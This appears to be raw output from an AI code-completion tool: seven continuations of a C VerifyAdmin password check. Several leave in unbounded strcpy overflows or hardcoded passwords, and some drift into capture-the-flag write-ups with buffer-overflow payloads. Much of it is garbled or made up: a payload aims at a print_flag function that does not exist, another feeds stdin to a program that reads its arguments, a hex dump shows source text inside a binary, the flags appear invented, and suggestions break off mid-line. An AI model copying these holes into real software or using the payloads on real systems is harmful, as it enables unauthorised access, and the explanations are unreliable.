#include <stdio.h>
#include <stdlib.h>

int VerifyAdmin(char *password) {
    Synthesizing 7/10 solutions

=======
Suggestion 1

      int i = 0;
  while (password[i] != '\0') {
    if (password[i] == 'a') {
      i++;
      if (password[i] == 'd') {
        i++;
        if (password[i] == 'm') {
          i++;
          if (password[i] == 'i') {
            i++;
            if (password[i] == 'n') {
              i++;
              if (password[i] == '\0') {
                return 1;
              }
            }
          }
        }
      }
    }
    i++;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    printf("Usage: %s <password>\n", argv[0]);
    return 1;
  }
  if (VerifyAdmin(argv[1])) {
    printf("You are an admin!\n");
  } else {
    printf("Sorry, you are not an admin!\n");
  }
  return 0;
}

=======
Suggestion 2

      char buffer[16];
  int auth_flag = 0;
  strcpy(buffer, password);
  if (strcmp(buffer, "brillig") == 0)
    auth_flag = 1;
  if (strcmp(buffer, "outgrabe") == 0)
    auth_flag = 1;
  return auth_flag;
}

int main(int argc, char *argv[]) {
  if (argc < 2) {
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }
  if (VerifyAdmin(argv[1])) {
    printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    printf("      Access Granted.\n");
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
  } else {
    printf("\nAccess Denied.\n");
  }
}
```

The code is vulnerable to buffer overflow attack. We can overflow the buffer and overwrite the auth_flag variable with 1 to get the flag.

```bash
python -c 'print "A"*16 + "\x01\x00\x00\x00"' | ./auth
```

## Level 2

```c
// Language: c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  char buffer[64];
  if (argc < 2) {
    printf("Usage: %s <password>\n", argv[0]);
    exit(0);
  }
  strcpy(buffer, argv[1]);
  if (0 == strcmp(buffer, "brillig")) {
    printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    printf("      Access Granted.\n");
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
  } else {
    printf("\nAccess Denied.\n");
  }
}
```

The code is vulnerable to buffer overflow attack. We can overflow the buffer and overwrite the return address with the address of the print_flag function to get the flag.

```bash
python -c 'print "A"*64 + "\x56\x84\x04\x08"' | ./auth
```

## Level 3

```c
// Language: c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
  char buffer[64];
  if (argc < 2) {
    printf("Usage: %s <password>\n", argv[

=======
Suggestion 3

        int result = 0;
    char pass[8];
    int i;
    for (i = 0; i < 8; i++) {
        pass[i] = password[i];
    }
    if (pass[0] == 'a') {
        if (pass[1] == 'd') {
            if (pass[2] == 'm') {
                if (pass[3] == 'i') {
                    if (pass[4] == 'n') {
                        if (pass[5] == '1') {
                            if (pass[6] == '2') {
                                if (pass[7] == '3') {
                                    result = 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    return result;
}

int main() {
    char *password = malloc(8);
    scanf("%s", password);
    if (VerifyAdmin(password)) {
        printf("Success!\n");
    } else {
        printf("Wrong password!\n");
    }
    return 0;
}
```

The code is simple. It checks whether the first 8 characters of the input is equal to `admin123`. If it is, it prints `Success!`, otherwise it prints `Wrong password!`.

The problem is that `VerifyAdmin` function is not called anywhere in the code. So, we need to find a way to call it.

The first thing I did is to look at the assembly code. I used [Godbolt](https://godbolt.org/).

```asm
VerifyAdmin:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     QWORD PTR [rbp-16], rdi
        mov     DWORD PTR [rbp-20], 0
        mov     DWORD PTR [rbp-24], 0
        mov     DWORD PTR [rbp-28], 0
        mov     DWORD PTR [rbp-32], 0
        mov     DWORD PTR [rbp-36], 0
        mov     DWORD PTR [rbp-40], 0
        mov     DWORD PTR [rbp-44], 0
        mov     DWORD PTR [rbp-48], 0
        mov     eax, DWORD PTR [rbp-48]
        cmp     eax, 97
        j

=======
Suggestion 4

        char buffer[16];
    int flag = 0;
    strcpy(buffer, password);
    if(strcmp(buffer, "admin") == 0) {
        flag = 1;
    }
    return flag;
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <password>\n", argv[0]);
        exit(0);
    }
    if(VerifyAdmin(argv[1])) {
        printf("Access Granted.\n");
    } else {
        printf("Access Denied.\n");
    }
    return 0;
}
```

### Vulnerability

The vulnerable function is `VerifyAdmin()`. The function uses `strcpy()` to copy the user input into the `buffer` array. However, the input is not checked for length, which means that the user can input a string that is longer than the `buffer` array. This will cause a buffer overflow.

### Exploitation

The `flag` variable is located directly after the `buffer` array in memory. This means that if the user inputs a string that is longer than the `buffer` array, the `flag` variable will be overwritten. Since the `flag` variable is used to determine whether the user's input is correct, we can overwrite the `flag` variable to change the program's behavior.

### Payload

```bash
./vuln $(python -c 'print "A"*16 + "\x01"')
```

### Flag

`picoCTF{flag_d4d11e8b}`

=======
Suggestion 5

      char *correctPassword = "password123";
  int verified = 0;
  if (strcmp(password, correctPassword) == 0) {
    verified = 1;
  }
  return verified;
}

int main() {
  char *password = malloc(100);
  printf("Enter password: ");
  scanf("%s", password);
  int admin = VerifyAdmin(password);
  if (admin) {
    printf("Welcome admin!\n");
  } else {
    printf("Sorry, you are not admin.\n");
  }
  return 0;
}
```

When we run this program, we see that it requires a password to be entered. If we enter the correct password, the program welcomes us as an admin. If we enter the wrong password, the program tells us we are not an admin.

```
$ ./verify_admin
Enter password: password123
Welcome admin!
$ ./verify_admin
Enter password: wrong
Sorry, you are not admin.
```

The problem with this program is that the password is stored in the program. If we open the program in a hex editor, we can see the password `password123` in the program.

```
$ xxd verify_admin
00000000: 2321 2f75 7362 2f65 6e76 2020 0a23 696e  #!/usb/env  .#in
00000010: 636c 7564 6520 3c73 7464 696f 2e68 3e0a  clude <stdio.h>.
00000020: 636c 6173 7369 6320 3c73 7472 696e 672e  classic <string.
00000030: 683e 0a0a 696e 7420 5665 7269 6679 4164  h>..int VerifyAd
00000040: 6d69 6e28 6368 6172 202a 7061 7373 776f  min(char *passwo
00000050: 7264 2920 7b0a 2020 6368 6172 202a 636f  rd) {.  char *co
00000060: 7272 6563 7450 6173 7377 6

=======
Suggestion 6

      if (password[0] == 'p' && password[1] == 'a' && password[2] == 's' &&
      password[3] == 's' && password[4] == 'w' && password[5] == 'o' &&
      password[6] == 'r' && password[7] == 'd') {
    return 1;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("Usage: %s <password>\n", argv[0]);
    return 1;
  }
  if (VerifyAdmin(argv[1])) {
    printf("Access granted.\n");
  } else {
    printf("Access denied.\n");
  }
  return 0;
}
```

The `VerifyAdmin` function checks if the password starts with `password`. If so, it returns `1`, otherwise it returns `0`. This means that we can just pass `password` as the argument and we will get access granted.

```
$ ./verify password
Access granted.
```

## Flag

`picoCTF{not_this_again_eekcdsffgk}`

=======
Suggestion 7

        int i = 0;
    while (password[i] != '\0') {
        if (password[i] < 0x20 || password[i] > 0x7e) {
            return 0;
        }
        i++;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        puts("Usage: ./admin <password>");
        return 1;
    }
    if (VerifyAdmin(argv[1])) {
        puts("Welcome admin!");
    } else {
        puts("Access denied!");
    }
    return 0;
}
```

The password must consist only of printable ASCII characters, and it must be
passed as the first command-line argument.

We can use the following Python script to generate a password that satisfies
both conditions:

```python
#!/usr/bin/env python3
import string
import random

while True:
    password = ''.join(random.choice(string.printable) for _ in range(10))
    if all(0x20 <= ord(c) <= 0x7e for c in password):
        break

print(password)
```

